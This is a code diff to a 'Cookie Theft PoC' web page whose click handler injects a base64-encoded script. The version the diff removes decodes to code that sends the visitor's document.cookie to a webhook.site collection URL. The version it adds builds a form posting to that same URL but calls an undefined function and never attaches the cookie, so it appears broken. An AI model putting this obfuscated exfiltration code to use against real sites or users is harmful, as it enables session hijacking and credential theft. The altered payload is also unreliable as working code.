@@ -17,18 +17,31 @@
 </head>
 <body>
     <h1>Cookie Theft PoC</h1>
-    <button class="test-button" onclick="triggerAttack()">Steal Cookies</button>
 
     <script>
         function triggerAttack() {
-            // Base64 encoded JavaScript payload
-            var encodedPayload = 'bmV3IEltYWdlKCkuc3JjID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzhjZmZmM2FhLTMzYTctNDRkMy05ZGUxLTg2ZmQyOWIwOTY3Yi9yZWNlaXZlLWNvb2tpZXM/Y29va2llPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKTsK';
-
-            // Create a script element and set its source to the Base64 encoded payload
+            // Base64 encoded payload to run when the button is clicked
+            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwpwcm9wcyhmaXNjaCwgeyBtZXRob2Q6ICdQT1NUJywgYWN0aW9uOiAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGNmZmYzYWEtMzNhNy00NGQzLTlkZTEtODZmZDI5YjA5NjdiL3JlY2VpdmUtY29va2llcycgfSk7';
+            
+            // Decode the Base64 encoded payload
+            var decodedPayload = atob(encodedPayload);
+            
+            // Create a script element
             var script = document.createElement('script');
-            script.src = 'data:text/javascript;base64,' + encodedPayload;
+            script.textContent = decodedPayload; // Inject decoded script content
+            
+            // Append the script to the body
             document.body.appendChild(script);
         }
+
+        // Create the button element
+        var button = document.createElement('button');
+        button.className = 'test-button';
+        button.textContent = 'Steal Cookies';
+        button.onclick = triggerAttack;
+
+        // Append the button to the body
+        document.body.appendChild(button);
     </script>
 </body>
 </html>
